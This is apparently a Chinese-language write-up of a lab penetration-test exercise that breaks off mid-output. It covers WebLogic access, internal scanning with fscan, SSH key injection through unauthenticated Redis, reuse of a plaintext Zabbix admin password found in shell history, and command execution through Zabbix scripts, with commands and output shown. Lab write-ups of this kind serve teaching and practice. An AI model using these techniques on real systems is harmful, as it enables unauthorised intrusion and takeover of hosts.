<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/dfdf306c-1d24-4b7f-bb9f-7d8a8aed5688.png"></p>
<p>CVE_2020_2551</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># pwd</span>
/home/weblogic/Oracle/Middleware/user_projects/domains/base_domain


<span class="token comment"># ls -al ../../../coherence_3.7/</span>
total <span class="token number">16</span>
drwxrwxr-x. <span class="token number">6</span> weblogic weblogic  <span class="token number">121</span> Apr <span class="token number">23</span> 07:26 <span class="token builtin class-name">.</span>
drwxrwxr-x. <span class="token number">8</span> weblogic weblogic  <span class="token number">204</span> Apr <span class="token number">23</span> 07:29 <span class="token punctuation">..</span>
drwxr-x---. <span class="token number">2</span> weblogic weblogic  <span class="token number">265</span> Apr <span class="token number">23</span> 07:25 bin
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic   <span class="token number">38</span> Apr <span class="token number">23</span> 07:26 .home
drwxrwxr-x. <span class="token number">3</span> weblogic weblogic   <span class="token number">25</span> Apr <span class="token number">23</span> 07:26 inventory
drwxrwxr-x. <span class="token number">3</span> weblogic weblogic <span class="token number">4096</span> Apr <span class="token number">23</span> 07:25 lib
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">339</span> Apr <span class="token number">23</span> 07:26 .product.properties
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic   <span class="token number">97</span> Apr <span class="token number">23</span> 07:25 product.xml
drwxrwxr-x. <span class="token number">2</span> weblogic weblogic   <span class="token number">31</span> Apr <span class="token number">23</span> 07:26 uninstall

<span class="token comment"># ls -al ../../../coherence_3.7/bin</span>
drwxr-x---. <span class="token number">2</span> weblogic weblogic  <span class="token number">265</span> Apr <span class="token number">23</span> 07:25 <span class="token builtin class-name">.</span>
drwxrwxr-x. <span class="token number">6</span> weblogic weblogic  <span class="token number">121</span> Apr <span class="token number">23</span> 07:26 <span class="token punctuation">..</span>
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">831</span> Apr <span class="token number">23</span> 07:25 cache-server.cmd
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic <span class="token number">1003</span> Apr <span class="token number">23</span> 07:25 cache-server.sh
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic <span class="token number">1165</span> Apr <span class="token number">23</span> 07:25 coherence.cmd
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic <span class="token number">1340</span> Apr <span class="token number">23</span> 07:25 coherence.sh
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">574</span> Apr <span class="token number">23</span> 07:25 datagram-test.cmd
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">691</span> Apr <span class="token number">23</span> 07:25 datagram-test.sh
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">583</span> Apr <span class="token number">23</span> 07:25 multicast-test.cmd
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">694</span> Apr <span class="token number">23</span> 07:25 multicast-test.sh
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">546</span> Apr <span class="token number">23</span> 07:25 optimize.reg
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic <span class="token number">1108</span> Apr <span class="token number">23</span> 07:25 query.cmd
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic <span class="token number">1208</span> Apr <span class="token number">23</span> 07:25 query.sh
-rw-rw-r--. <span class="token number">1</span> weblogic weblogic  <span class="token number">976</span> Apr <span class="token number">23</span> 07:25 readme.txt

<span class="token comment"># ps -ef</span>
<span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
root         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> May20 ?        00:00:03 /usr/lib/systemd/systemd --switched-root --system --deserialize <span class="token number">21</span>
root         <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>
root         <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:0H<span class="token punctuation">]</span>
root         <span class="token number">5</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/u4:0<span class="token punctuation">]</span>
root         <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>
root         <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>migration/0<span class="token punctuation">]</span>
root         <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>rcu_bh<span class="token punctuation">]</span>
root         <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>rcu_sched<span class="token punctuation">]</span>
root        <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>lru-add-drain<span class="token punctuation">]</span>
root        <span class="token number">11</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>watchdog/0<span class="token punctuation">]</span>
root        <span class="token number">12</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>watchdog/1<span class="token punctuation">]</span>
root        <span class="token number">13</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>migration/1<span class="token punctuation">]</span>
root        <span class="token number">14</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ksoftirqd/1<span class="token punctuation">]</span>
root        <span class="token number">16</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/1:0H<span class="token punctuation">]</span>
root        <span class="token number">18</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kdevtmpfs<span class="token punctuation">]</span>
root        <span class="token number">19</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>netns<span class="token punctuation">]</span>
root        <span class="token number">20</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>khungtaskd<span class="token punctuation">]</span>
root        <span class="token number">21</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>writeback<span class="token punctuation">]</span>
root        <span class="token number">22</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kintegrityd<span class="token punctuation">]</span>
root        <span class="token number">23</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>bioset<span class="token punctuation">]</span>
root        <span class="token number">24</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>bioset<span class="token punctuation">]</span>
root        <span class="token number">25</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>bioset<span class="token punctuation">]</span>
root        <span class="token number">26</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kblockd<span class="token punctuation">]</span>
root        <span class="token number">27</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>md<span class="token punctuation">]</span>
root        <span class="token number">28</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>edac-poller<span class="token punctuation">]</span>
root        <span class="token number">29</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>watchdogd<span class="token punctuation">]</span>
root        <span class="token number">36</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kswapd0<span class="token punctuation">]</span>
root        <span class="token number">37</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ksmd<span class="token punctuation">]</span>
root        <span class="token number">38</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>khugepaged<span class="token punctuation">]</span>
root        <span class="token number">39</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>crypto<span class="token punctuation">]</span>
root        <span class="token number">47</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kthrotld<span class="token punctuation">]</span>
root        <span class="token number">48</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/u4:1<span class="token punctuation">]</span>
root        <span class="token number">49</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kmpath_rdacd<span class="token punctuation">]</span>
root        <span class="token number">50</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kaluad<span class="token punctuation">]</span>
root        <span class="token number">52</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kpsmoused<span class="token punctuation">]</span>
root        <span class="token number">53</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:2<span class="token punctuation">]</span>
root        <span class="token number">54</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ipv6_addrconf<span class="token punctuation">]</span>
root        <span class="token number">67</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>deferwq<span class="token punctuation">]</span>
root       <span class="token number">120</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kauditd<span class="token punctuation">]</span>
root       <span class="token number">201</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>rpciod<span class="token punctuation">]</span>
root       <span class="token number">202</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xprtiod<span class="token punctuation">]</span>
root       <span class="token number">263</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ata_sff<span class="token punctuation">]</span>
root       <span class="token number">276</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_0<span class="token punctuation">]</span>
root       <span class="token number">277</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>scsi_tmf_0<span class="token punctuation">]</span>
root       <span class="token number">279</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_1<span class="token punctuation">]</span>
root       <span class="token number">280</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/1:1H<span class="token punctuation">]</span>
root       <span class="token number">282</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>scsi_tmf_1<span class="token punctuation">]</span>
root       <span class="token number">294</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>bioset<span class="token punctuation">]</span>
root       <span class="token number">295</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfsalloc<span class="token punctuation">]</span>
root       <span class="token number">296</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs_mru_cache<span class="token punctuation">]</span>
root       <span class="token number">297</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-buf/vda1<span class="token punctuation">]</span>
root       <span class="token number">298</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-data/vda1<span class="token punctuation">]</span>
root       <span class="token number">299</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-conv/vda1<span class="token punctuation">]</span>
root       <span class="token number">300</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-cil/vda1<span class="token punctuation">]</span>
root       <span class="token number">301</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-reclaim/vda<span class="token punctuation">]</span>
root       <span class="token number">302</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-log/vda1<span class="token punctuation">]</span>
root       <span class="token number">303</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfs-eofblocks/v<span class="token punctuation">]</span>
root       <span class="token number">304</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>xfsaild/vda1<span class="token punctuation">]</span>
root       <span class="token number">305</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:1H<span class="token punctuation">]</span>
root       <span class="token number">403</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/lib/systemd/systemd-journald
root       <span class="token number">440</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/lib/systemd/systemd-udevd
root       <span class="token number">472</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /sbin/auditd
root       <span class="token number">478</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>hwrng<span class="token punctuation">]</span>
root       <span class="token number">538</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>ttm_swap<span class="token punctuation">]</span>
root       <span class="token number">552</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>kvm-irqfd-clean<span class="token punctuation">]</span>
polkitd    <span class="token number">554</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/lib/polkit-1/polkitd --no-debug
root       <span class="token number">556</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/bin/qemu-ga --method<span class="token operator">=</span>virtio-serial --path<span class="token operator">=</span>/dev/virtio-ports/org.qemu.guest_agent.0 --blacklist<span class="token operator">=</span>guest-file-open,guest-file-close,guest-file-read,guest-file-write,guest-file-seek,guest-file-flush,guest-exec,guest-exec-status -F/etc/qemu-ga/fsfreeze-hook
rpc        <span class="token number">557</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /sbin/rpcbind -w
root       <span class="token number">566</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/sshd -D
root       <span class="token number">568</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/rsyslogd -n
root       <span class="token number">571</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/irqbalance --foreground
root       <span class="token number">585</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/gssproxy -D
dbus       <span class="token number">586</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/bin/dbus-daemon --system --address<span class="token operator">=</span>systemd: --nofork --nopidfile --systemd-activation
root       <span class="token number">587</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /bin/sh /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/startWebLogic.sh
chrony     <span class="token number">595</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/chronyd
root       <span class="token number">596</span>   <span class="token number">587</span>  <span class="token number">0</span> May20 ?        00:00:00 /bin/sh /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/bin/startWebLogic.sh
root       <span class="token number">616</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root       <span class="token number">618</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/lib/systemd/systemd-logind
root       <span class="token number">683</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/sbin/crond -n
root       <span class="token number">691</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
root       <span class="token number">693</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ttyS0    00:00:00 /sbin/agetty --keep-baud <span class="token number">115200,38400</span>,9600 ttyS0 vt220
root       <span class="token number">800</span>   <span class="token number">596</span>  <span class="token number">0</span> May20 ?        00:00:17 /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.261-2.6.22.2.el7_8.x86_64/bin/java -Xms512m -Xmx512m -Dweblogic.Name<span class="token operator">=</span>AdminServer -Djava.security.policy<span class="token operator">=</span>/home/weblogic/Oracle/Middleware/wlserver_10.3/server/lib/weblogic.policy -da -Dplatform.home<span class="token operator">=</span>/home/weblogic/Oracle/Middleware/wlserver_10.3 -Dwls.home<span class="token operator">=</span>/home/weblogic/Oracle/Middleware/wlserver_10.3/server -Dweblogic.home<span class="token operator">=</span>/home/weblogic/Oracle/Middleware/wlserver_10.3/server -Dweblogic.management.discover<span class="token operator">=</span>true -Dwlw.iterativeDev<span class="token operator">=</span> -Dwlw.testConsole<span class="token operator">=</span> -Dwlw.logErrorsToConsole<span class="token operator">=</span> -Dweblogic.ext.dirs<span class="token operator">=</span>/home/weblogic/Oracle/Middleware/patch_wls1036/profiles/default/sysext_manifest_classpath:/home/weblogic/Oracle/Middleware/patch_ocp371/profiles/default/sysext_manifest_classpath weblogic.Server
root       <span class="token number">817</span>     <span class="token number">1</span>  <span class="token number">0</span> May20 ?        00:00:00 /usr/libexec/postfix/master -w
postfix    <span class="token number">827</span>   <span class="token number">817</span>  <span class="token number">0</span> May20 ?        00:00:00 pickup -l -t unix -u
postfix    <span class="token number">828</span>   <span class="token number">817</span>  <span class="token number">0</span> May20 ?        00:00:00 qmgr -l -t unix -u
root       <span class="token number">986</span>     <span class="token number">2</span>  <span class="token number">0</span> May20 ?        00:00:00 <span class="token punctuation">[</span>dio/vda1<span class="token punctuation">]</span>
root      <span class="token number">1305</span>     <span class="token number">2</span>  <span class="token number">0</span> 00:01 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:1<span class="token punctuation">]</span>


<span class="token function">find</span> / -mtime -30 -type f -exec <span class="token function">grep</span> <span class="token string">"flag{"</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>找不到 flag 在哪，人麻了</p>
<p><em>（后来才知道这台机器就没 flag，啥也不说太蠢了</em></p>
<p>改密码 ssh 登上去看算了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"root:miaotony111"</span><span class="token operator">|</span>chpasswd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="内网-1"><a href="#内网-1" class="headerlink" title="内网"></a>内网</h3><pre class="line-numbers language-none"><code class="language-none"># ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 52:54:42:26:4c:87 brd ff:ff:ff:ff:ff:ff
    inet 10.103.132.0/16 brd 10.103.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:42ff:fe26:4c87/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 52:54:5b:1b:d9:6e brd ff:ff:ff:ff:ff:ff
    inet 192.168.33.77/24 brd 192.168.33.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:5bff:fe1b:d96e/64 scope link
       valid_lft forever preferred_lft forever
       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">(icmp) Target 192.168.33.77   is alive
(icmp) Target 192.168.33.55   is alive
(icmp) Target 192.168.33.127  is alive
(icmp) Target 192.168.33.149  is alive
[*] Icmp alive hosts len is: 4
192.168.33.77:7001 open
192.168.33.55:6379 open
192.168.33.127:3306 open
192.168.33.149:80 open
192.168.33.127:80 open
192.168.33.149:22 open
192.168.33.127:22 open
192.168.33.55:22 open
192.168.33.77:22 open
[*] alive ports len is: 9
start vulscan
[*] WebTitle: http://192.168.33.149     code:200 len:13906  title:None
[*] WebTitle: http://192.168.33.127     code:403 len:4897   title:Apache HTTP Server Test Page powered by CentOS
[+] Redis:192.168.33.55:6379 unauthorized file://dump.rdb
[+] Redis:192.168.33.55:6379 like can write /root/.ssh/
[+] Redis:192.168.33.55:6379 like can write /var/spool/cron/
[*] WebTitle: http://192.168.33.77:7001 code:404 len:1164   title:Error 404--Not Found
[+] InfoScan:http://192.168.33.77:7001 [weblogic]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="flag1-192-168-33-55-6379-redis"><a href="#flag1-192-168-33-55-6379-redis" class="headerlink" title="flag1 192.168.33.55:6379 redis"></a>flag1 192.168.33.55:6379 redis</h3><p>直接写公钥好了</p>
<pre class="line-numbers language-none"><code class="language-none">./fscan_amd64 -h 192.168.33.55 -rf id_ed25519.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/afb9f6c8-8a38-4c79-8b3b-0d1564c77f18.png"></p>
<p>连上去拿 flag</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/b41d9382-d159-4328-9195-40e77279064f.png"></p>
<pre class="line-numbers language-none"><code class="language-none"># ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 52:54:1d:7a:2e:db brd ff:ff:ff:ff:ff:ff
    inet 10.103.173.192/16 brd 10.103.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:1dff:fe7a:2edb/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 52:54:4f:1b:b8:25 brd ff:ff:ff:ff:ff:ff
    inet 192.168.33.55/24 brd 192.168.33.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:4fff:fe1b:b825/64 scope link
       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>还有个 10.103.173.192 内网啊？</del> 感觉只是大内网重复了？（后来和技术支持确认了就是入口机器共用的网段</p>
<pre class="line-numbers language-none"><code class="language-none">(icmp) Target 10.103.173.192  is alive
(icmp) Target 10.103.173.125  is alive
[*] Icmp alive hosts len is: 2
10.103.173.192:6379 open
10.103.173.192:22 open
10.103.173.125:3306 open
10.103.173.125:80 open
10.103.173.125:22 open
[*] alive ports len is: 5
start vulscan
[*] WebTitle: http://10.103.173.125     code:403 len:4897   title:Apache HTTP Server Test Page powered by CentOS
[+] Redis:10.103.173.192:6379 unauthorized file://dump.rdb
[+] Redis:10.103.173.192:6379 like can write /root/.ssh/
[+] Redis:10.103.173.192:6379 like can write /var/spool/cron/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none"># history
    1  #!/bin/bash
    2  #repo.sh
    3  git clone https://github.com/program/repo.git

   48  #database
   49  sudo apt install mysql-server mysql-client
   50  sudo mysql_secure_installation
   51  sudo mysql
   52  CREATE DATABASE my_db;
   53  CREATE USER 'my_user' IDENTIFIED BY 'password';
   54  GRANT ALL ON my_db.* TO 'my_user';
   55  FLUSH PRIVILEGES;
   56  exit
   57  mysql -u my_user -p
   58  SHOW DATABASES;
   59  #gitlab
   60  sudo apt install gitlab-ce
   61  sudo gitlab-ctl reconfigure
   62  curl http://192.168.33.127 -u Admin -p bQqYfe5eqN2CttsV
   63  cd /home/user1
   64  mkdir scripts
   65  cd scripts
   66  nano script1.sh
   67  chmod +x script1.sh
   68  ./script1.sh

  345  cd /usr/local/redis-3.2.2/
  346  ls
  347  vim redis.conf
  348  src/redis-server redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="flag2-192-168-33-127-Zabbix"><a href="#flag2-192-168-33-127-Zabbix" class="headerlink" title="flag2 192.168.33.127 Zabbix"></a>flag2 192.168.33.127 Zabbix</h3><p><a target="_blank" rel="noopener" href="http://192.168.33.127/zabbix/">http://192.168.33.127/zabbix/</a></p>
<p>入口机器的历史记录里有一条</p>
<p><code>curl http://192.168.33.127 -u Admin -p bQqYfe5eqN2CttsV</code></p>
<p>拿这个用户名密码去登录</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/aa72df0c-2b47-4a11-a54b-b14b37b21ef3.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/826e16d1-0ccb-4231-acf4-0b51307cdee8.png"></p>
<p>Zabbix 5.0.33 后台可以下发执行指令</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/b79ec47c-a139-49c6-a261-c185d95a5aa7.png"></p>
<p>先添加一下自己想要执行的脚本</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/a81a8f53-88f7-406b-aac5-db3c34ace12b.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/25f6eca4-5c6f-4b90-ae88-245ef6326060.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/7889934f-66ad-46d1-a415-e56ab73e70b3.png"></p>
<p>jumpserver	192.168.33.149: 10050</p>
<p>Zabbix server	127.0.0.1: 10050</p>
<pre class="line-numbers language-none"><code class="language-none">id; whoami; ps -ef; ls -al /root; cat /root/flag; case $? in [01]) true;; *) false;; esac
     
    uid=997(zabbix) gid=994(zabbix) groups=994(zabbix)
    zabbix
    UID        PID  PPID  C STIME TTY          TIME CMD
    root         1     0  0 14:15 ?        00:00:03 /usr/lib/systemd/systemd --switched-root --system --deserialize 21
    root         2     0  0 14:15 ?        00:00:00 [kthreadd]
    root         4     2  0 14:15 ?        00:00:00 [kworker/0:0H]
    root         6     2  0 14:15 ?        00:00:00 [ksoftirqd/0]
    root         7     2  0 14:15 ?        00:00:00 [migration/0]
    root         8     2  0 14:15 ?        00:00:00 [rcu_bh]
    root         9     2  0 14:15 ?        00:00:00 [rcu_sched]
